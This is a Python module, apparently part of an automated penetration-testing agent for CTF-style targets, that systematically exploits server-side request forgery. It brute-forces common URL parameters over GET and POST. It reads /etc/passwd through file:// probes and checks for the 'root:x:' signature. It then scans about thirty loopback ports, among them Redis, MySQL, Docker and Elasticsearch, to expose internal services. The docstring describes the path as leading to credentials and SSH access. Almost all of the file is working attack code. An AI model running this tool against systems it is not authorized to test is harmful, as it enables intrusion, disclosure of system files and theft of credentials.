"""Deterministic SSRF exploitation — find the param, confirm, scan internal ports.

The agent reaches the SSRF stage (it finds a ``url=`` endpoint) but doesn't
systematize the exploitation: it retries ``url=http://example.com`` and loops,
never doing the internal port-scan that reveals the internal service behind the
SSRF (the canonical TryHackMe-style path: SSRF → localhost:<internal port> →
creds → SSH). This module does that deterministically and injects the result as
ground truth, the same way web_enum injects the enumerated surface.

Three steps:
  1. find the SSRF parameter — try common param names over GET and POST, probing
     ``file:///etc/passwd`` and looking for the ``root:x:`` signature.
  2. confirm + read files via ``file://``.
  3. internal port-scan — fuzz ``http://127.0.0.1:<port>`` over common ports and
     flag the ones whose response diverges from a known-closed baseline.

Pure/testable: the only impure piece is the injected ``fetcher`` (HTTP), mirroring
web_enum's runner / source_review's Reviewer.
"""

from __future__ import annotations

from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

# Probes are I/O-bound (one HTTP round-trip each); fan them out so a non-SSRF
# target doesn't burn the whole phase budget exhausting params serially.
_MAX_WORKERS = 12

# Common parameter names that carry a URL the server will fetch (SSRF sinks).
SSRF_PARAMS: tuple[str, ...] = (
    "url",
    "uri",
    "link",
    "redirect",
    "dest",
    "destination",
    "path",
    "src",
    "u",
    "target",
    "host",
    "page",
    "load",
    "fetch",
    "proxy",
    "next",
    "file",
    "image",
    "img",
    "domain",
    "site",
    "callback",
    "return",
    "data",
)

# Internal ports worth probing through the SSRF (web admin panels, app servers,
# datastores). Ordered by how often CTF/real internal services sit there.
INTERNAL_PORTS: tuple[int, ...] = (
    80, 8080, 8000, 3000, 5000, 8443, 443, 9000, 9090, 8888,
    1337, 4000, 5001, 8081, 8082, 3001, 6379, 3306, 5432, 27017,
    9200, 11211, 2375, 5601, 15672, 8983, 9001, 7001, 8161, 50000,
)

_FILE_PROBE = "file:///etc/passwd"
_PASSWD_SIG = "root:x:"
_CLOSED_PORT_PROBE = "http://127.0.0.1:1/"  # a port that's ~never open → baseline
# Ports that are almost always serving SOMETHING on a web target's loopback.
# Used to confirm an http-only SSRF (file:// is commonly blocked): if probing one
# of these diverges from the closed baseline, the param fetches server-side.
_OPEN_CANDIDATES: tuple[int, ...] = (80, 443, 22, 8080, 3306)


# fetcher(method, base_url, params) -> (status_code, body)
Fetcher = Callable[[str, str, dict], tuple[int, str]]


@dataclass(frozen=True)
class SsrfFinding:
    kind: str  # "file_read" | "internal_port"
    param: str
    method: str  # "GET" | "POST"
    detail: str = ""
    port: int = 0
    evidence: str = ""


@dataclass
class SsrfResult:
    param: str | None = None
    method: str | None = None
    findings: list[SsrfFinding] = field(default_factory=list)


def _port_looks_open(closed_status: int, closed_body: str, status: int, body: str) -> bool:
    """A probed internal port looks OPEN when its response diverges enough from the
    known-closed baseline. SSRF backends usually return a connection-refused error
    page for closed ports and *something else* (banner, redirect, HTML, timeout
    diff) for open ones."""
    if status != closed_status:
        return True
    cb, b = closed_body or "", body or ""
    if not cb and not b:
        return False
    delta = abs(len(b) - len(cb)) / max(1, len(cb))
    return delta > 0.25


def _eval_param(base_url: str, param: str, method: str, fetcher: Fetcher) -> tuple[bool, str]:
    """Test ONE (param, method): is it an SSRF sink? Returns (confirmed, leaked_body).

    Two signals (file:// is commonly blocked, so we can't rely on it alone):
      1. **file read** — ``file:///etc/passwd`` returns the ``root:x:`` signature.
      2. **http divergence** — a likely-open loopback port (80/443/…) responds
         differently from a known-closed baseline (``127.0.0.1:1``); only a
         server-side fetch can tell them apart."""
    # Signal 1 — file read (one probe, also exfiltrates if it works).
    try:
        _s, fb = fetcher(method, base_url, {param: _FILE_PROBE})
    except Exception:  # noqa: BLE001 — one bad probe must not abort the sweep
        fb = ""
    if fb and _PASSWD_SIG in fb:
        return True, fb

    # Signal 2 — http divergence vs a known-closed baseline.
    try:
        c_status, c_body = fetcher(method, base_url, {param: _CLOSED_PORT_PROBE})
    except Exception:  # noqa: BLE001
        return False, ""
    for port in _OPEN_CANDIDATES:
        try:
            o_status, o_body = fetcher(method, base_url, {param: f"http://127.0.0.1:{port}/"})
        except Exception:  # noqa: BLE001
            continue
        if _port_looks_open(c_status, c_body, o_status, o_body):
            return True, ""  # confirmed http-based SSRF, no file read
    return False, ""


def find_ssrf_param(
    base_url: str,
    *,
    fetcher: Fetcher,
    params: tuple[str, ...] = SSRF_PARAMS,
) -> tuple[str | None, str | None, str]:
    """Find the SSRF parameter across common names × GET/POST.

    Combos are probed concurrently (I/O-bound) so a non-SSRF target can't burn the
    budget serially; the result is still deterministic — the first confirmed combo
    in priority order (param order, GET before POST) wins. ``leaked_body`` is the
    /etc/passwd dump when file read worked, else "" (still a confirmed SSRF via http
    divergence). Returns (None, None, "") if no param fetches server-side."""
    combos = [(param, method) for param in params for method in ("GET", "POST")]
    confirmed: dict[int, tuple[str, str, str]] = {}
    with ThreadPoolExecutor(max_workers=_MAX_WORKERS) as ex:
        futures = {
            ex.submit(_eval_param, base_url, param, method, fetcher): (idx, param, method)
            for idx, (param, method) in enumerate(combos)
        }
        for fut in as_completed(futures):
            idx, param, method = futures[fut]
            try:
                ok, leaked = fut.result()
            except Exception:  # noqa: BLE001
                ok, leaked = False, ""
            if ok:
                confirmed[idx] = (param, method, leaked)
    if confirmed:
        return confirmed[min(confirmed)]
    return None, None, ""


def scan_internal_ports(
    base_url: str,
    param: str,
    method: str,
    *,
    fetcher: Fetcher,
    ports: tuple[int, ...] = INTERNAL_PORTS,
) -> list[int]:
    """Through the confirmed SSRF param, fuzz ``http://127.0.0.1:<port>`` and return
    the ports whose response diverges from a known-closed baseline (likely open)."""
    try:
        closed_status, closed_body = fetcher(method, base_url, {param: _CLOSED_PORT_PROBE})
    except Exception:  # noqa: BLE001
        closed_status, closed_body = 0, ""

    def _probe(port: int) -> int | None:
        try:
            status, body = fetcher(method, base_url, {param: f"http://127.0.0.1:{port}/"})
        except Exception:  # noqa: BLE001
            return None
        return port if _port_looks_open(closed_status, closed_body, status, body) else None

    with ThreadPoolExecutor(max_workers=_MAX_WORKERS) as ex:
        found = ex.map(_probe, ports)
    return [p for p in found if p is not None]


def probe_ssrf(
    base_url: str,
    *,
    fetcher: Fetcher,
    params: tuple[str, ...] = SSRF_PARAMS,
    ports: tuple[int, ...] = INTERNAL_PORTS,
) -> SsrfResult:
    """Full deterministic SSRF sweep: find param → file read → internal port scan."""
    result = SsrfResult()
    param, method, leaked = find_ssrf_param(base_url, fetcher=fetcher, params=params)
    if not param or not method:
        return result

    result.param = param
    result.method = method
    if leaked:
        snippet = " ".join(leaked.splitlines()[:3])[:160]
        result.findings.append(
            SsrfFinding(
                kind="file_read",
                param=param,
                method=method,
                detail="/etc/passwd readable via file:// (confirms SSRF + file disclosure)",
                evidence=snippet,
            )
        )
    else:
        result.findings.append(
            SsrfFinding(
                kind="confirmed",
                param=param,
                method=method,
                detail="server-side fetch confirmed via loopback port divergence",
                evidence=f"{method} {param}=http://127.0.0.1:<open> differs from :1 (closed)",
            )
        )

    for port in scan_internal_ports(base_url, param, method, fetcher=fetcher, ports=ports):
        result.findings.append(
            SsrfFinding(
                kind="internal_port",
                param=param,
                method=method,
                port=port,
                detail=f"internal service reachable via SSRF at 127.0.0.1:{port}",
                evidence=f"{method} {param}=http://127.0.0.1:{port}/",
            )
        )
    return result
